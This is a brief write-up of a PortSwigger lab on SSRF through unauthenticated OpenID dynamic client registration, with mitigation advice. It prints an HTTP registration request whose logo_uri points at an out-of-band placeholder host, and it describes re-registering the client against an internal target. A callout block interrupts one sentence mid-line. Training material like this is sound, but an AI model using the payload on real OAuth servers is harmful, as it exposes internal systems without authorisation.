# Lab 06 — SSRF via OpenID dynamic client registration

> **Expert** · [Official lab](https://portswigger.net/web-security/oauth/openid/lab-oauth-ssrf-via-openid-dynamic-client-registration)

**Entry point:** the OAuth service supports **unauthenticated dynamic

> 🔧 **Burp Community alternative:** Collaborator is Pro-only. Use a free out-of-band service instead — [interact.sh](https://interact.sh) or [canarytokens.org](https://canarytokens.org) give you a unique subdomain with **DNS + HTTP** logging (HTTP-only option: [webhook.site](https://webhook.site)). Substitute its domain wherever this write-up says `YOUR-COLLABORATOR-SUBDOMAIN`.
client registration** (`/reg`) and fetches `logo_uri` for the consent page.

## Solution

1. Read `/.well-known/openid-configuration` → registration endpoint `/reg`.
2. Register a client with a Collaborator logo:

```http
POST /reg HTTP/1.1
Host: oauth-YOUR-ID.oauth-server.net
Content-Type: application/json

{"redirect_uris":["https://example.com"],
 "logo_uri":"https://YOUR-COLLABORATOR-SUBDOMAIN"}
```

3. `GET /client/<NEW-CLIENT-ID>/logo` → Collaborator shows an HTTP
   interaction — SSRF confirmed.
4. Re-register with the internal target and fetch the logo — the response
   body contains the internal page contents (the lab's secret data) —
   submit it — lab solved.

## Mitigation

Require authentication for dynamic registration; validate `logo_uri`
(allow-list, resolve + pin IPs, block internal ranges).
